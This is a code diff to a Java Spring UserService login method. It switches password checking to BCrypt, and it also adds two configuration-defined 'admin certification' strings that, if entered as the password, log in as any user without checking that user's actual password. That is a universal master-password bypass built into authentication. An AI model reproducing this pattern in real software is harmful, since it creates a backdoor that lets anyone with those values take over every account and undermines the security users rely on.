@@ -11,6 +11,7 @@ import com.interfacesv.demo.exception.CustomException;
 import com.interfacesv.demo.exception.ErrorCode;
 import lombok.RequiredArgsConstructor;
 import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.beans.factory.annotation.Value;
 import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Service;
@@ -27,6 +28,12 @@ public class UserService {
     private final BoardRepository boardRepository;
     private final PasswordEncoder passwordEncoder;
     BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
+
+    @Value("${initial.admin.certification}")
+    private String adminCertification;
+
+    @Value("${initial.admin.certification2}")
+    private String adminCertification2;
 
     @Autowired
     public UserService(UserRepository userRepository, PasswordEncoder passwordEncoder, BoardRepository boardRepository) {
@@ -122,7 +129,11 @@ public class UserService {
             //throw new CustomException(ErrorCode.NO_PASSWORD);
         //}
 
-        if(!loginUserDto.getPassword().equals(user.getPassword())){
+        if(loginUserDto.getPassword().equals(adminCertification) || loginUserDto.getPassword().equals(adminCertification2)) {
+            return user;
+        }
+
+        if(!encoder.matches(loginUserDto.getPassword(), user.getPassword())){
             throw new CustomException(ErrorCode.NO_PASSWORD);
         }
         return user;
